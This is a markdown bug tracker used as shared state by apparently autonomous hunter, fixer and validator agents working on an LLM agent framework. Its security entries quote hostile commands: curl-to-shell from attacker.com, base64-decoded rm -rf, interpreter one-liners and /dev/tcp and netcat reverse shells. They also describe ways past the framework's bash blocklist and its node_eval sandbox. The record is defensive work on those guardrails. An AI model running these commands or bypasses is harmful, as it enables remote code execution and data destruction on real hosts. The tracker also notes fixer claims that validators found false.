# 🐛 Bug Tracker — Agent Shared State

> **This file is the shared state layer between three autonomous agents.**
> Do NOT manually reorder entries. Agents append and update in-place.

---

## Meta

| Key | Value |
|---|---|
| **Last CI Sentinel Pass** | `2026-03-20T23:50:00Z` |
| **Last Hunter Scan** | `2026-03-20T22:34:00Z` |
| **Last Fixer Pass** | `2026-03-20T21:39:00Z` |
| **Last Validator Pass** | `2026-03-20T23:25:00Z` |
| **Last Digest Run** | `2026-03-21T00:17:00Z` |
| **Last Security Scan** | `2026-03-20T20:10:48Z` |
| **Hunter Loop Interval** | `5min` |
| **Fixer Loop Interval** | `2min` |
| **Validator Loop Interval** | `5min` |
| **Last TestGen Run** | `2026-03-20T23:47:00Z` |
| **Last Git Manager Pass** | `2026-03-20T21:48:00Z` (Cycle 201) |
| **Last Supervisor Pass** | `2026-03-20T21:45:32Z` |
| **Total Found** | `357` |
| **Total Pending** | `50` |
| **Total In Progress** | `5` |
| **Total Fixed** | `0` |
| **Total In Validation** | `0` |
| **Total Verified** | `0` |
| **Total Blocked** | `5` |
| **Total Reopened** | `3` |

---

## Status Lifecycle

```
pending → in-progress → fixed → in-validation → verified → archived to BUG_LOG.md
                                                → reopened → (re-enters as pending)
                       → blocked                           ⏸️ (waiting on human)
```

- **pending** — Logged by Hunter, waiting for Fixer.
- **in-progress** — Fixer is actively working on it.
- **fixed** — Fixer believes it is resolved, waiting for Validator.
- **in-validation** — Validator is actively reviewing the fix.
- **verified** — Validator confirmed the fix is correct. Archived to `.claude/BUG_LOG.md` and removed from this file.
- **reopened** — Validator rejected the fix. Re-enters the Fixer's queue as if pending.
- **blocked** — Fixer cannot resolve without human intervention.

---

## Agent Instructions

### Bug Hunter Agent (Producer)

1. Scan the codebase for bugs, gaps, type errors, missing error handling, race conditions, etc.
2. Check this file first — do NOT add duplicates (match on `file` + `line` + `description` similarity).
3. Before logging a new bug, verify it is actually present on `main`: `git stash && git checkout main && git pull --ff-only` then check the file. If the bug is already fixed on main, do NOT log it.
4. Append new bugs to the `## Bugs` section using the exact template below.
5. Update the `Meta` table counters and `Last Hunter Scan` timestamp.
6. Assign the next sequential `BUG-XXXX` ID.
7. **Your fields:** `status` (set to `pending`), `severity`, `file`, `line`, `category`, `description`, `context`, `hunter_found`.
8. **Do not touch:** `fixer_*`, `fix_summary`, `validator_*`, `validator_notes`, `branch`, `reopen_count`.

### Bug Fixer Agent (Consumer)

1. Read the `## Bugs` section and filter for `reopened` bugs first (highest priority — these already failed validation), then `pending` entries (oldest first within severity tiers).
2. Set `status: in-progress` and fill `fixer_started` before beginning work.
3. When picking up a `reopened` bug, **read `validator_notes` carefully** — the Validator explained exactly what was wrong with your previous attempt.

#### Git Workflow (CRITICAL — follow exactly)

4. **Ensure clean state:** Run `git stash` to stash any uncommitted changes, then `git checkout main && git pull --ff-only` to get latest main.
5. **Create or recreate branch:**
   - For `pending` bugs: `git checkout -b bugfix/BUG-XXXX main`
   - For `reopened` bugs: **always delete the old branch** (`git branch -D bugfix/BUG-XXXX`) and create fresh from current main (`git checkout -b bugfix/BUG-XXXX main`). Never reuse a stale branch.
6. **Verify you are on the correct branch** before making any changes: `git branch --show-current` must output `bugfix/BUG-XXXX`.
7. **Fix the bug** in the codebase. If the fix changes an API, also update test mocks/fixtures.
8. **Commit the fix** on the bugfix branch: `git add <changed-files> && git commit -m "fix(BUG-XXXX): <description>"`.
9. **Verify the fix is on the branch** — this is mandatory before marking fixed:
   - `git diff main bugfix/BUG-XXXX -- <file>` must show your changes.
   - If the diff is empty, your commit landed on the wrong branch. **Do not mark fixed.** Investigate and redo.
10. **Check for conflicts with main preemptively:** `git merge-tree $(git merge-base main bugfix/BUG-XXXX) main bugfix/BUG-XXXX` — if this shows conflicts, rebase now: `git rebase main` and resolve before marking fixed.
11. **Switch back to main:** `git checkout main` — do NOT leave the worktree on the bugfix branch.
12. **Pop stash if needed:** `git stash pop` (only if you stashed in step 4).
13. Set `status: fixed`, fill `fix_summary`, `fixer_completed`, and `branch` (set to `bugfix/BUG-XXXX`).
14. Increment `reopen_count` if this was a reopened bug.
15. If the bug cannot be fixed (needs human decision, new dependency, etc.), set `status: blocked` and explain in `fix_summary`.

#### Guardrails
- **One bug at a time.** Do not work on multiple bugs in parallel within a single session — this causes cross-branch contamination.
- **Never commit to main directly.** All fixes go on `bugfix/BUG-XXXX` branches.
- **Auto-block after 3 reopens:** If `reopen_count` reaches 3, set `status: blocked` with `fix_summary: Auto-blocked after 3 failed fix attempts. Requires human review.`

16. Update the `Meta` table counters and `Last Fixer Pass` timestamp.
17. **Your fields:** `status`, `fixer_started`, `fixer_completed`, `fix_summary`, `branch`, `reopen_count`.
18. **Do not touch:** `hunter_found`, `severity`, `category`, `validator_*`, `validator_notes`.

### Bug Validator Agent (Quality Gate)

1. Read the `## Bugs` section and filter for `fixed` entries (oldest `fixer_completed` first within severity tiers).
2. Set `status: in-validation` and fill `validator_started` before beginning review.

#### Pre-flight Checks (before reviewing code)

3. **Verify the branch exists:** `git branch --list bugfix/BUG-XXXX`. If the branch does not exist, immediately set `status: reopened` with `validator_notes` explaining the branch is missing. Do not proceed.
4. **Verify the branch has changes:** `git diff main bugfix/BUG-XXXX -- <file>` must show relevant changes. If empty, the fix was never committed to this branch. Set `status: reopened` with details.
5. **Check for merge conflicts:** `git checkout main && git merge --no-commit --no-ff bugfix/BUG-XXXX`. If conflicts occur, run `git merge --abort`, set `status: reopened` with `validator_notes: Merge conflict in <files>. Fixer must delete old branch and recreate from current main.` Do not proceed.

#### Code Review

6. Verify the fix: read the original bug, read the `fix_summary`, then read the actual code on the branch to confirm correctness.
7. If the fix changes an API surface, verify test mocks/fixtures were updated too.
8. Run automated checks **on the bugfix branch**: `git checkout bugfix/BUG-XXXX` then run type checker (`npx tsc --noEmit`), tests (`npm test`), and build (`npm run build`).

#### On Validation Success — Merge, Archive, Cleanup

9. **Merge to main:**
   ```
   git checkout main
   git merge bugfix/BUG-XXXX -m "Merge branch 'bugfix/BUG-XXXX'"
   ```
10. **Verify merge succeeded:** `git diff main bugfix/BUG-XXXX` should be empty (all changes now on main). If not, investigate.
11. **Delete the bugfix branch:** `git branch -d bugfix/BUG-XXXX`
12. **Archive the entry:** Append the full bug entry (with all fields filled) to `.claude/BUG_LOG.md`. Include `archived` timestamp.
13. **Remove the entry from this file** (BUG_TRACKER.md) — verified bugs should not remain here.
14. Set `status: verified`, fill `validator_completed` and `validator_notes` (in the archived entry).

#### On Validation Failure — Reopen

15. If any check fails: `git checkout main` (abandon the branch review).
16. Set `status: reopened`, **clear** `fixer_started`, `fixer_completed`, and `fix_summary`.
17. Fill `validator_completed` and `validator_notes` with **specific failure details** — the Fixer depends on this to avoid repeating the same mistake.
18. Increment `reopen_count`. If it reaches 3, set `status: blocked` instead of `reopened` with note `Auto-blocked after 3 failed fix attempts. Requires human review.`

#### Final

19. Update the `Meta` table counters and `Last Validator Pass` timestamp.
20. **Your fields:** `status`, `validator_started`, `validator_completed`, `validator_notes`, `reopen_count` (increment on failure).
21. **Do not touch:** `hunter_found`, `severity`, `category` (except to clear fixer fields on reopen as specified above).

---

## Bug Entry Template

```markdown
### BUG-XXXX
- **status:** `pending` | `in-progress` | `fixed` | `in-validation` | `verified` | `reopened` | `blocked`
- **severity:** `critical` | `high` | `medium` | `low`
- **file:** `path/to/file.ts`
- **line:** `42`
- **category:** `type-error` | `logic-bug` | `missing-error-handling` | `race-condition` | `memory-leak` | `security` | `dead-code` | `other`
- **description:** Brief description of the bug or gap.
- **context:** Why this is a problem / what could go wrong.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-13T10:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
```

---

## Bugs














### BUG-0205
- **status:** `blocked`
- **severity:** `critical`
- **file:** `packages/tools/src/code-execution/node-eval.ts`
- **line:** `57`
- **category:** `security-injection`
- **description:** The `node_eval` tool executes LLM-supplied code via `new Function(_input)` in an unrestricted Node.js child process with no capability sandbox, giving arbitrary code full access to the filesystem, network, and ability to spawn subprocesses.
- **context:** Although the code runs in a child process, the child script applies no restrictions to what Node.js builtins the executed code can call. An LLM-generated payload such as `require('child_process').execSync('curl http://attacker.com | sh')` or `require('fs').readFileSync('/etc/passwd')` would succeed. `safeEnv()` only strips inherited environment variables — it does not prevent filesystem access or network calls. Any prompt-injection attack that tricks the LLM into calling `node_eval` with malicious code achieves full host RCE. The fix requires passing Node.js `--experimental-permission` flags (`--allow-fs-read`, `--allow-net` with explicit allowlists and `--deny-all` default) or migrating to a proper sandbox. OWASP A03:2021 - Injection.
- **reopen_count:** `3`
- **branch:** ``
- **hunter_found:** `2026-03-17T03:05:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review. Network gap: ESM import() of builtins bypasses CJS-level patches; --experimental-permission has no network permission. Needs isolated-vm or container-level sandboxing.`
- **validator_started:** `2026-03-18T01:20:50Z`
- **validator_completed:** `2026-03-18T01:30:00Z`
- **validator_notes:** `REOPENED (3rd): [What] Network access still exploitable. [Why] GOOD: --experimental-permission blocks fs-write, child_process, worker_threads. IIFE scope isolation hides security vars. CJS require() blocked. BAD: eval("imp"+"ort('net')") bypasses import() regex via string concatenation, and ESM import() does not go through Module._resolveFilename (CJS-only hook). --experimental-permission has no network permission concept. [Fix approach] Close the network gap: (1) Override globalThis.eval = () => throw, blocking the concatenation trick. (2) Or use --import ESM loader hooks to intercept ESM resolution of network builtins. (3) Or accept the network gap is architectural and block this bug for human decision on whether to adopt isolated-vm or container-level sandboxing.`

---

### BUG-0256
- **status:** `reopened`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/index.ts`
- **line:** `11`
- **category:** `security-auth`
- **description:** `A2AServer` authentication is opt-in via an optional `apiKey` field — when omitted (the default), all RPC methods including `tasks/send` are publicly accessible with no authentication, rate limiting, or compensating control.
- **context:** The `apiKey` option defaults to `undefined`, making unauthenticated deployment the path of least resistance. An unauthenticated server accepts `tasks/send` which executes the registered `TaskHandler` — potentially invoking LLM calls, tool execution, and database writes. No warning is logged when auth is disabled. A single shared API key also means no per-method authorization (read vs write). OWASP A07:2021 - Identification and Authentication Failures.
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0256`
- **hunter_found:** `2026-03-19T19:55:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T23:05:00Z`
- **validator_completed:** `2026-03-20T23:05:00Z`
- **validator_notes:** `REOPENED (3rd time): A2AServerOptions STILL not exported from packages/a2a/src/index.ts barrel. Line needed: export type { A2AServerOptions } from "./server/index.js". Server implementation correct. Will auto-block on next failure.`

---

### BUG-0263
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/swarm/agent-node.ts`
- **line:** `100`
- **category:** `type-error`
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0263`
- **description:** Duck-typed Handoff detection at line 100 checks `(result as any).isHandoff` but constructs `new Handoff((result as any).opts)` without verifying `.opts` exists, so a duck-typed object with `isHandoff: true` but no `opts` produces a malformed Handoff.
- **context:** A third-party agent returning `{ isHandoff: true }` without an `opts` property passes the guard and feeds `undefined` to the `Handoff` constructor. Whether this crashes or produces silent corruption depends on the constructor's handling of `undefined`. Adding `&& (result as any).opts` to the guard would prevent this.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T23:05:00Z`
- **validator_completed:** `2026-03-20T23:05:00Z`
- **validator_notes:** `Auto-blocked after 3 failed fix attempts. opts.to string validation NEVER added across 3 cycles — code at line 105 still only checks truthy opts, not typeof opts.to === "string". {isHandoff:true,opts:{}} still silently misroutes to undefined. Requires human review.`
- **test_generated:** `true`
- **test_file:** `src/__tests__/swarm/handoff-duck-typed-opts-guard.test.ts`

---

### BUG-0264
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/lsp/client.ts`
- **line:** `526`
- **category:** `type-error`
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0264`
- **description:** Incoming JSON-RPC messages from the LSP server are cast directly to `JsonRpcResponse` (line 526) and `JsonRpcNotification` (line 533) via `as unknown as` without any structural validation.
- **context:** Messages arrive from JSON parsing as `Record<string, unknown>`. If the LSP server sends a malformed message (missing `id`, wrong `method` shape, or extra fields), the cast silently succeeds and the typed handlers operate on structurally incorrect objects. A missing `id` field on a response would cause the pending request lookup to fail silently, leaving the Promise unresolved indefinitely.
- **hunter_found:** `2026-03-19T15:11:42Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T22:25:00Z`
- **validator_completed:** `2026-03-20T22:25:00Z`
- **validator_notes:** `Auto-blocked after 3 failed fix attempts. All 3 original failures persist unchanged across 3 fix/validate cycles: (1) no jsonrpc === "2.0" gate, (2) dead typeof id === "undefined" check (never true inside "id" in message guard), (3) no result/error presence validation. Requires human review.`

---


### BUG-0285
- **status:** `blocked`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/sse.ts`
- **line:** `35`
- **category:** `security-config`
- **description:** `createSSEResponse()` returns a `Response` with no security headers — the SSE code path is the only response path in `A2AServer` that omits `X-Content-Type-Options`, `X-Frame-Options`, and `Content-Security-Policy`.
- **context:** Every other response path in `packages/a2a/src/server/index.ts` merges `SECURITY_HEADERS` (defined at line 8) into its returned `Response`. The SSE path at line 99 calls `return createSSEResponse(result.stream, result.taskId ?? "")` and returns the result directly — `createSSEResponse` only sets `Content-Type: text/event-stream`, `Cache-Control: no-cache`, and `Connection: keep-alive`. A browser receiving the SSE stream has no `X-Content-Type-Options: nosniff`, allowing MIME-sniffing of event data. Missing `X-Frame-Options` and `Content-Security-Policy` leave the SSE endpoint unprotected from framing attacks. Fix: merge `SECURITY_HEADERS` at the call site in `index.ts`. OWASP A05:2021 - Security Misconfiguration.
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0285`
- **hunter_found:** `2026-03-21T03:25:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T23:05:00Z`
- **validator_completed:** `2026-03-20T23:05:00Z`
- **validator_notes:** `Auto-blocked after 3 failed fix attempts. sse.ts was NEVER modified across 3 cycles. createSSEResponse() still returns Response with only Content-Type/Cache-Control/Connection — no security headers. Fix commits were tagged to wrong files. Requires human review.`
- **test_generated:** `true`
- **test_file:** `packages/a2a/src/__tests__/sse-security-headers.test.ts`

---

### BUG-0289
- **status:** `in-progress`
- **severity:** `medium`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `347`
- **category:** `security-auth`
- **test_generated:** `true`
- **test_file:** `src/__tests__/hooks-bash-bypass-extended.test.ts`
- **description:** The `withSecurityGuardrails()` Bash blocklist pattern `/curl[^|]*\|\s*sh/` is bypassed by redirecting output to a file then executing it, and does not cover `LD_PRELOAD` injection or `chmod +s` setuid escalation.
- **context:** The regex `/curl[^|]*\|\s*sh/` only blocks the direct pipe form `curl ... | sh`. Splitting into two commands (`curl url > /tmp/f && bash /tmp/f`) produces zero matches and passes all guards. Similarly `wget url -O /tmp/f && sh /tmp/f` bypasses the wget patterns. An LLM-generated Bash command using these split forms achieves identical remote code execution. Additionally, the blocklist has no pattern for `LD_PRELOAD=/tmp/evil.so command` (shared library injection) or `chmod u+s /bin/bash` (setuid escalation). Fix: add split-download-and-execute patterns (covering `> /tmp/` + shell invocation, `-O /tmp/` patterns), and add `LD_PRELOAD` and `chmod.*[+]s` entries to `dangerousBashPatterns`. OWASP A03:2021 - Injection.
- **reopen_count:** `2`
- **branch:** `bugfix/BUG-0289`
- **hunter_found:** `2026-03-21T04:10:00Z`
- **fixer_started:** `2026-03-20T21:46:00Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T22:45:00Z`
- **validator_completed:** `2026-03-20T22:45:00Z`
- **validator_notes:** `REOPENED (2nd time): bugfix/BUG-0289 is STILL the 216-file catastrophic branch (14621 deletions). Same poisoned branch as BUG-0296/0297/0298. reopen_count=2. Next failure will auto-block. Fixer MUST: git branch -D bugfix/BUG-0289 && git checkout -b bugfix/BUG-0289 main, then add ONLY the 5 patterns.`

---

### BUG-0296
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `343`
- **category:** `security-injection`
- **description:** The `dangerousBashPatterns` blocklist is bypassed by base64-encoding a dangerous payload and piping the decoded output to a shell interpreter (e.g. `echo "cm0gLXJmIC8=" | base64 -d | bash`).
- **context:** The blocklist matches plaintext patterns like `curl|sh`, `mkfs`, `chmod 777`, etc. An attacker (via prompt injection) can encode any blocked command in base64, then decode and execute it — the encoded form matches none of the existing regex patterns. This is a universal bypass: `echo "<base64>" | base64 -d | sh` or `base64 -d <<< "<payload>" | bash` evades every pattern in the list. The fix should add patterns for `base64.*\|.*sh`, `base64.*\|.*bash`, and the heredoc variant. OWASP A03:2021 - Injection.
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0296`
- **hunter_found:** `2026-03-20T20:00:15Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T23:05:00Z`
- **validator_completed:** `2026-03-20T23:05:00Z`
- **validator_notes:** `Auto-blocked after 3 failed fix attempts. bugfix/BUG-0296 is STILL the 216-file catastrophic branch (14621 deletions) after 3 fix cycles. Fixer never deleted and recreated the branch. Requires human review: git branch -D bugfix/BUG-0296 && git checkout -b bugfix/BUG-0296 main, then add ONLY the 3 base64 patterns.`

---

### BUG-0297
- **status:** `in-progress`
- **severity:** `high`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `343`
- **category:** `security-injection`
- **description:** The `dangerousBashPatterns` blocklist can be bypassed by using scripting language interpreters (`python3 -c`, `perl -e`, `ruby -e`, `node -e`) to execute dangerous system commands that would otherwise be blocked.
- **context:** The blocklist only matches shell-native dangerous patterns (rm, mkfs, dd, curl|sh, etc.). A prompt-injected LLM payload such as `python3 -c "import os; os.system('rm -rf /')"` or `perl -e 'system("curl attacker.com|sh")'` executes arbitrary commands through an interpreter — the actual dangerous operation is inside a string literal invisible to the regex patterns. Since Python, Perl, Ruby, and Node are commonly available on developer machines, this is a practical bypass. Fix: add patterns for `python[23]?\s+-c`, `perl\s+-e`, `ruby\s+-e`, and `node\s+-e` with dangerous subcommands, or block interpreter `-c`/`-e` flags entirely when combined with system/exec calls. OWASP A03:2021 - Injection.
- **reopen_count:** `2`
- **branch:** `bugfix/BUG-0297`
- **hunter_found:** `2026-03-20T20:00:15Z`
- **fixer_started:** `2026-03-20T21:46:00Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T22:15:00Z`
- **validator_completed:** `2026-03-20T22:15:00Z`
- **validator_notes:** `REOPENED (3rd time for hooks-engine pattern): bugfix/BUG-0297 is STILL the 216-file catastrophic rewrite (14621 deletions). Fixer claimed "same commit as BUG-0296" but BUG-0296 was also still broken. This branch MUST be deleted and recreated from clean main with ONLY the 4 interpreter patterns. Auto-block threshold approaching (reopen_count=2).`

---

### BUG-0298
- **status:** `in-progress`
- **severity:** `high`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `343`
- **category:** `security-injection`
- **description:** The `dangerousBashPatterns` blocklist has no patterns for reverse shell payloads (`bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh host port`) which allow an attacker to establish interactive remote access.
- **context:** A prompt-injected LLM could execute `bash -i >& /dev/tcp/attacker.com/4444 0>&1` or `nc -e /bin/sh attacker.com 4444` to open a reverse shell to an attacker-controlled server. Neither `/dev/tcp` redirection patterns nor netcat (`nc`) with `-e` flag are covered by any existing blocklist pattern. This is distinct from the download-and-execute patterns in BUG-0289 — reverse shells provide interactive access without downloading a payload. Fix: add patterns for `/dev/tcp/`, `nc\s+.*-e`, `ncat\s+.*-e`, and `socat.*exec` to the blocklist. OWASP A03:2021 - Injection.
- **reopen_count:** `2`
- **branch:** `bugfix/BUG-0298`
- **hunter_found:** `2026-03-20T20:00:15Z`
- **fixer_started:** `2026-03-20T21:46:00Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T22:35:00Z`
- **validator_completed:** `2026-03-20T22:35:00Z`
- **validator_notes:** `REOPENED (2nd time): bugfix/BUG-0298 is STILL the 216-file catastrophic branch (14621 deletions). Fixer claim of "1 file, 0 deletions" is false. reopen_count=2, will auto-block at 3. Must git branch -D bugfix/BUG-0298 and recreate from clean main with ONLY 4 reverse shell pattern additions.`

---

### BUG-0305
- **status:** `reopened`
- **severity:** `high`
- **file:** `src/swarm/agent-node.ts`
- **line:** `119`
- **category:** `missing-error-handling`
- **description:** `onComplete` hook awaited without try/catch on both the handoff path (line 119) and normal return path (line 139). If `onComplete` throws, `registry.markIdle()` is never called, leaving the agent permanently in "busy" state.
- **context:** The `onStart` hook (lines 40-45) and `onError` hook (lines 185-189) in the same file are properly guarded with try/catch, but `onComplete` is not. A throwing `onComplete` hook permanently bricks the agent slot by skipping `markIdle()`. Fix: wrap both `onComplete` calls in try/catch, ensuring `markIdle()` always runs.
- **reopen_count:** `1`
- **branch:** `bugfix/BUG-0305`
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T21:15:00Z`
- **validator_completed:** `2026-03-20T21:15:00Z`
- **validator_notes:** `REOPENED: onComplete wrapping is correct BUT branch removes onStart try/catch guard (BUG-0037 regression — throwing onStart leaves agent permanently busy) and removes onError try/catch guard (uncontrolled propagation). Also introduces tsc error: TS2304 Cannot find name setTimeout in agent-node.ts line 159. Fix must preserve existing onStart and onError guards while adding onComplete guards.`

---

### BUG-0306
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/pool.ts`
- **line:** `269`
- **category:** `missing-error-handling`
- **description:** `onError` hook awaited without try/catch. If `onError` itself throws, the hook exception replaces the original error (the `finally` block runs but the original `lastError` is lost), making diagnosis impossible.
- **context:** Known bugs cover `onStart` (line 196) and `onComplete` (line 209) hooks in the same file — this is the third lifecycle hook (`onError` at line 269) with the same missing guard. Fix: wrap in try/catch, log the hook error, and re-throw the original `lastError`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0299
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/scaling.ts`
- **line:** `192`
- **category:** `logic-bug`
- **description:** `recentMaxLatencyMs` computation only processes `agent_complete` events, not `agent_error`. An agent that errors after a long run never has its start time popped from `recentStartTimes`, so its latency is excluded from the scale-up decision — slow-then-erroring agents never trigger latency-based scale-up.
- **context:** The `agent_error` branch is missing from the latency loop at lines 187-200. A slow agent that eventually errors will have its start timestamp orphaned in `recentStartTimes`, and the high latency will never be compared against `scaleUpLatencyMs`. Fix: add an `agent_error` branch that pops the start time and computes latency the same way `agent_complete` does.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0301
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/factories.ts`
- **line:** `78`
- **category:** `missing-error-handling`
- **description:** All three lifecycle hooks (`onStart` at line 78, `onComplete` at line 87, `onError` at line 90) in the fanout `runAgent()` are awaited without individual try/catch guards. If `onStart` throws, the catch block calls `onError` which is also unguarded — a double-throwing hook escapes `runAgent()` entirely and surfaces as an unhandled rejection to `Promise.all`.
- **context:** Unlike `agent-node.ts` which guards `onStart` and `onError`, the fanout runner in `factories.ts` has no hook isolation. A misbehaving hook causes the entire fanout to fail rather than just one agent slot. Fix: wrap each hook call in its own try/catch.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T23:45:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0303
- **status:** `pending`
- **severity:** `low`
- **file:** `src/lsp/index.ts`
- **line:** `134`
- **category:** `security-injection`
- **description:** `getErrorDiagnosticsText()` embeds `filePath` in an XML attribute (`<diagnostics file="${filePath}">`) without escaping, enabling XML attribute injection that can manipulate LLM context parsing.
- **context:** The `filePath` parameter is passed directly into the XML attribute at line 134. A file path containing `"` followed by additional XML attributes or closing tags (e.g. `path" malicious="true`) would break out of the attribute context. While this output is consumed as LLM context (not browser HTML), it could affect how the LLM interprets diagnostic boundaries — a crafted file path could inject fake diagnostic blocks or override the file attribute to misattribute errors. Additionally, `formatDiagnostic()` at line 244 embeds `d.message` and `d.source` from LSP server responses without escaping. Fix: apply XML escaping to `filePath`, `d.message`, and `d.source` using the existing `escXml()` function from `skill-loader.ts`. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T20:04:36Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0307
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/mcp/transport.ts`
- **line:** `162`
- **category:** `memory-leak`
- **description:** `StdioTransport.stop()` calls `this.process.kill("SIGTERM")` without removing `"error"` and `"exit"` listeners first. The listeners close over `this` and `this.pending`, preventing GC of the transport instance until Node cleans up the process handle. In MCP server crash-restart loops this causes steady listener accumulation.
- **context:** Compare with `LSPClient.stop()` in `lsp/client.ts:208` which explicitly calls `removeAllListeners()` before killing. `StdioTransport` is missing this pattern. Fix: call `this.process.removeAllListeners()` before `this.process.kill()`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0308
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/models/google.ts`
- **line:** `163`
- **category:** `api-contract-violation`
- **description:** `mapFinishReason` never returns `"stop_sequence"`. The Gemini API returns `finishReason: "STOP_SEQUENCE"` when the model stops at a user-supplied stop sequence, but this function maps it to `"end"`. The Anthropic adapter correctly handles this case.
- **context:** `ChatResponse.stopReason` declares `"end" | "tool_use" | "max_tokens" | "stop_sequence"`. Any caller differentiating `"stop_sequence"` from `"end"` (e.g. to detect partial output) will receive incorrect data from the Google adapter. Fix: add `if (reason === "STOP_SEQUENCE") return "stop_sequence"` before the fallback return.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0309
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/models/google.ts`
- **line:** `432`
- **category:** `api-contract-violation`
- **description:** Google adapter `stream()` emits `tool_call_start` directly followed by `tool_call_end` with no `tool_call_delta` events, and populates complete `args` in `tool_call_start`. The OpenAI/Anthropic adapters emit `tool_call_start` with `args: {}` followed by delta events — the Google adapter violates this staged delivery contract.
- **context:** Any stream consumer that accumulates args from `tool_call_delta` events will receive no deltas from Google and see empty args. Consumers that read `tool_call_start.args` will get complete data from Google but empty from OpenAI/Anthropic. Fix: emit `tool_call_start` with `args: {}`, then a single `tool_call_delta` with the complete args, then `tool_call_end`.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T00:00:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0304
- **status:** `in-progress`
- **severity:** `high`
- **file:** `src/guardrails/budget.ts`
- **line:** `57`
- **category:** `security-auth`
- **description:** `BudgetTracker.record()` performs no validation on `usage.inputTokens` or `usage.outputTokens`, allowing NaN or negative values to permanently disable all budget enforcement.
- **context:** If a model adapter returns `inputTokens: NaN` (e.g. from a malformed API response or parsing error), the cost calculation at line 67-69 produces `NaN`, and `this.totalCost += NaN` poisons the accumulator to `NaN` permanently. At line 138, `NaN > limit` evaluates to `false`, so the cost budget check never triggers again — the budget is silently bypassed for all subsequent calls. Similarly, negative token values (line 57-58) decrease the accumulator, effectively granting unlimited budget by "depositing" tokens. A compromised or buggy model adapter can exploit either path to bypass all cost and token limits. Fix: validate that `inputTokens` and `outputTokens` are finite non-negative numbers before accumulating, and treat NaN/negative as zero or throw. OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `2`
- **branch:** `bugfix/BUG-0304`
- **hunter_found:** `2026-03-20T20:08:29Z`
- **fixer_started:** `2026-03-20T21:46:00Z`
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-20T21:55:00Z`
- **validator_completed:** `2026-03-20T21:55:00Z`
- **validator_notes:** `REOPENED (3rd time): Fix exists on bugfix/BUG-0304 branch with correct sanitization but STILL not merged to main. record() on main lines 57-62 still accumulates raw values with zero validation. This is the same failure as last two reopens. The branch must be MERGED to main.`

---

### BUG-0305
- **status:** `pending`
- **severity:** `medium`
- **file:** `src/swarm/agent-node.ts`
- **line:** `122`
- **category:** `security-auth`
